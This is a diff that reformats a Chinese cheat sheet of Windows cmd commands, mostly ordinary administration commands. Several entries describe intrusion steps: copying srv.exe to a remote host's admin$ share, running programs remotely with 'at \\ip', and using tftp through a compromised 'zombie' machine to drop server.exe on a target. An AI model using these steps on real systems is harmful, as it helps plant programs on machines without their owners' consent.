@@ -63,7 +63,8 @@ net user guest 12345 用guest用户登陆后用将密码改为12345
 
 net password 密码 更改系统登陆密码
 
-netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
+netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 
+netstat -p 协议名 例：`netstat -p tcq/ip` 查看某协议使用情况（查看tcp/ip协议使用情况）
 
 netstat -s 查看正在使用的所有协议使用情况
 
@@ -79,7 +80,9 @@ tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有�
 
 kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
 
-move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
+move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
+
+`fc one.txt two.txt > 3st.txt` 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
 
  
 
@@ -93,23 +96,33 @@ at 查看所有的计划任务
 
 at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机
 
-finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入
+finger username @host 查看最近有哪些用户登陆 
+telnet ip 端口 远和登陆服务器,默认端口为23 
+open ip 连接到IP（属telnet登陆后的命令） 
+telnet 在本机上直接键入telnet 将进入本机的telnet 
 
-telnet 将进入本机的telnet copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:\srv.exe $">\\ip\admin$ 复制本地c:\srv.exe到对方的admin下 cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
+copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，
+用参数/y就同时取消确认你要改写一份现存目录文件 
+`copy c:\srv.exe $">\\ip\admin$` 复制本地c:\srv.exe到对方的admin下 
+`copy 1st.jpg/b+2st.txt/a 3st.jpg` 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
 
-copy $\svv.exe">\\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
+`copy $\svv.exe">\\ip\admin$\svv.exe c:\ `或:`copy\\ip\admin$\*.*` 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
 
 xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件
 
-tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机
+`tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe `登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 
+`tftp -i 对方IP put c:\server.exe` 登陆后，上传本地c:\server.exe至主机
 
-ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway
+ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
+`route print`显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway
 
 addres，接口地址
 
 Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。
 
-arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况
+arp -a将显示出全部信息 
+
+start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况
 
 attrib 文件名(目录名) 查看某文件（目录）的属性
 
@@ -117,11 +130,20 @@ attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档�
 
 dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间
 
-set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
+set 指定环境变量名称=要指派给变量的字符 设置环境变量 
+set 显示当前所有的环境变量 
+set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
 
-pause 暂停批处理程序，并显示出：请按任意键继续.... if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
+pause 暂停批处理程序，并显示出：请按任意键继续.... 
+if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
+goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
 
-call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件
+call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
+for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
+echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 
+`echo 信息 >> pass.txt `将"信息"保存到pass.txt文件中 
+
+findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件
 
 title 标题名字 更改CMD窗口标题名字
 
@@ -139,17 +161,19 @@ format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format
 
 md 目录名 创建目录
 
- replace 源文件 要替换文件的目录 替换文件
+replace 源文件 要替换文件的目录 替换文件
 
- ren 原文件名 新文件名 重命名文件名
+ren 原文件名 新文件名 重命名文件名
 
- tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
+tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
 
- type 文件名 显示文本文件的内容
+type 文件名 显示文本文件的内容
 
- more 文件名 逐屏显示输出文件
+more 文件名 逐屏显示输出文件
 
- doskey 要锁定的命令＝字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=
+doskey 要锁定的命令＝字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：
+锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；
+解锁：doskey dir=
 
  taskmgr 调出任务管理器
 
@@ -165,23 +189,32 @@ cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命
 
 regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；
 
-regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况
+regedit /e 注册表文件名 导出注册表 
+cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。
+参数：
+/D 用户名:设定拒绝某用户访问；
+/P 用户名:perm 替换指定用户的访问权限；
+/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：`cacls D:\test.txt /D pub` 设定d:\test.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况
 
  
 
- IIS服务命令： iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） iisreset /start或stop 启动（停止）所有Internet服务 iisreset /restart 停止然后重新启动所有Internet服务 iisreset /status 显示所有Internet服务状态 iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
-
+IIS服务命令： 
+`iisreset /reboot` 重启win2k计算机（但有提示系统将重启信息出现） 
+iisreset /start或stop 启动（停止）所有Internet服务
+iisreset /restart 停止然后重新启动所有Internet服务 
+iisreset /status 显示所有Internet服务状态 
+iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
+iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
+iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
+iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
 
 
  win2003系统下新增命令（实用部份）：
 
-shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
+shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） 
+taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
 
- 
-
- tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。
-
- 
+tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 
 
  ## Linux系统下基本命令：
 
